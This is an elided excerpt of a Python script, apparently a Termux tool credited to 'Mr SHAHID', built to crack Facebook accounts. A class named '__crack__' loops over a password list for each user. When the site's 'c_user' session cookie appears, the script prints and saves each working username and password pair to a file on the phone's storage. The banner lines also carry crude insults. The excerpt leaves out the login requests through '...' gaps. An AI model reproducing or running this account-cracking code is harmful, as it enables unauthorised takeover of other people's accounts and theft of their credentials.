...
def R():
			os.system("clear")
			logo()
			print("               \033[1;92m♡ CODDER Mr ➵ SHAHID💔🥰 \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
			print (" [♡] CREDIT \033[1;92m➵ TERMUX-TEAM \033[1;92m")
			print(" [♡] FRIEND  \033[1;92m➵ I DONOT BE HAVE  \033[1;92m")
			print (' \033[1;92m♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡♡')
...
class __crack__:
	...
	def plerr(self):
		try:
			...
			print('\n [♡] ABY LOWDE DEKH K LAGA SAI FILE  STROGAE SY')
	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;32m[SHAHID-OK] %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('/sdcard/SHAHID_OK.txt','a').write('%s\n' % wrt)
				access = q['loc']
